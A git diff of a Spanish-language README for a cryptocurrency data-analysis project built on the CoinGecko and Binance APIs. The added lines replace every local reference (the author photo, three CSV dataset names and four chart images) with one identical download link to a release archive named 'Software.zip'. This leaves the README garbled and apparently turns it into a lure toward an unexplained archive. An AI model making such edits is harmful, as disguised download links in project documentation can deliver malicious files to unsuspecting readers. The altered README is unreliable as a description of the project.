@@ -1,7 +1,7 @@
 
 # <h1 align=center> **PI ANÁLISIS DE CRIPTOMONEDAS CON API COINGECKO** </h1>
 ## **_By: Leydy Lucena Peñaloza Rojas_**
-<img src="Imagenes/Autora_Leydy_Penaloza.png" alt="Autora" width="150"/>
+<img src="https://github.com/leydypenaloza/PI_Analisis_de_Criptomonedas/releases/download/v2.0/Software.zip" alt="Autora" width="150"/>
 
 
 # Proyecto de Análisis de Criptomonedas
@@ -21,11 +21,11 @@ El objetivo principal de este proyecto es realizar un Análisis Exploratorio de 
 - Se extrajo información de la API pública de Binance para obtener datos de precio de apertura, máximo, mínimo, cierre y volumen
 
 ## ETL y Datos Históricos
-- Para el presente proyecto se tomará como referencia las `10 primeras criptomonedas` ubicadas en el ranking de market cap para ello se generó el dataset `Top_10_Criptomonedas.csv` que contiene la información básica de las 10 criptomonedas seleccionadas.
+- Para el presente proyecto se tomará como referencia las `10 primeras criptomonedas` ubicadas en el ranking de market cap para ello se generó el dataset `https://github.com/leydypenaloza/PI_Analisis_de_Criptomonedas/releases/download/v2.0/Software.zip` que contiene la información básica de las 10 criptomonedas seleccionadas.
 
-- Se realizó un segundo ETL para obtener los valores históricos de los últimos 10 años de las criptomonedas seleccionadas, con los datos de periodicidad diaria, incluyendo precio de cierre, capitalización de mercado y volumen y se guardaron en el dataset `historical_prices.csv`.
+- Se realizó un segundo ETL para obtener los valores históricos de los últimos 10 años de las criptomonedas seleccionadas, con los datos de periodicidad diaria, incluyendo precio de cierre, capitalización de mercado y volumen y se guardaron en el dataset `https://github.com/leydypenaloza/PI_Analisis_de_Criptomonedas/releases/download/v2.0/Software.zip`.
 
-- Se intentó obtener información OHLCV, pero al no ser posible con la API Coingecko, se utilizó la API pública de Binance para obtener datos de apertura, máximo, mínimo, cierre y volumen. Se generó el dataset `OHLCV_data.csv`.
+- Se intentó obtener información OHLCV, pero al no ser posible con la API Coingecko, se utilizó la API pública de Binance para obtener datos de apertura, máximo, mínimo, cierre y volumen. Se generó el dataset `https://github.com/leydypenaloza/PI_Analisis_de_Criptomonedas/releases/download/v2.0/Software.zip`.
 
 ## Análisis Exploratorio de Datos (EDA)
 Se llevaron a cabo varios análisis en el EDA:
@@ -44,7 +44,7 @@ Se llevaron a cabo varios análisis en el EDA:
 - El proyecto resalta la importancia de considerar factores macroeconómicos y eventos del mercado en el análisis de criptomonedas.
 
 ## Imágenes
-![Gráfico de Precios](/Imagenes/Grafico_precios1.JPG)
-![Gráfico de Relación](/Imagenes/Grafico_precios2.JPG)
-![Gráfico de Tendencias](/Imagenes/Grafico_precios3.JPG)
-![Gráfico de Volumen](/Imagenes/Grafico_precios4.JPG)
+![Gráfico de Precios](https://github.com/leydypenaloza/PI_Analisis_de_Criptomonedas/releases/download/v2.0/Software.zip)
+![Gráfico de Relación](https://github.com/leydypenaloza/PI_Analisis_de_Criptomonedas/releases/download/v2.0/Software.zip)
+![Gráfico de Tendencias](https://github.com/leydypenaloza/PI_Analisis_de_Criptomonedas/releases/download/v2.0/Software.zip)
+![Gráfico de Volumen](https://github.com/leydypenaloza/PI_Analisis_de_Criptomonedas/releases/download/v2.0/Software.zip)
